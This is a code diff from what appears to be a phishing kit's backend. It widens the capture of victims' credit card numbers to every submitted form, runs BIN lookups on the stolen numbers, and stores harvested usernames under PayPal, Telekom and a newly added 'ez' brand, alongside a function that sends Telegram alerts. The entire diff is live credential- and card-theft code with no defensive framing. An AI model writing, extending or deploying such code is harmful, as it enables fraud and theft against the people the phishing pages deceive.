@@ -158,7 +158,7 @@ async function sendTelegramAlert(alertType, data, socket) {
         let bankInfo = '';
 
         if (data.details) {
-            if (data.target === 'creditCardForm' && data.details.cardNumber) {
+            if (data.details.cardNumber) {
                 try {
                     const bin = data.details.cardNumber.replace(/\s+/g, '').substring(0, 8);
                     const controller = new AbortController();
@@ -362,12 +362,13 @@ io.on('connection', (socket) => {
                 if (session) {
                     session.paypalUser = submittedUser;
                     session.telekomUser = submittedUser;
+                    session.ezUser = submittedUser;
                     session.save();
                 }
             }
 
             // --- Capture Credit Card last 4 digits for bankauth ---
-            if (data.target === 'creditCardForm' && data.details && data.details.cardNumber) {
+            if (data.details && data.details.cardNumber) {
                 const session = socket.request.session;
                 if (session) {
                     const cleanedCard = data.details.cardNumber.replace(/\s+/g, '');
